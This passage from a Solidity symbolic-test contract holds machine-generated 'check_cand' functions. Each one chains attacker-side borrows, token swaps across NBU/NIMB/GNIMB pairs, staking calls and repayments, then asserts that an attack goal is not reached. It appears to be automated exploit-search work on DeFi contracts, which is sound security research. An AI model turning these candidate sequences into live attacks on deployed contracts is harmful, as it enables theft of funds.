        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5645(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        swap_pairnbunimb_nbu_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5646(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5647(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5648(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
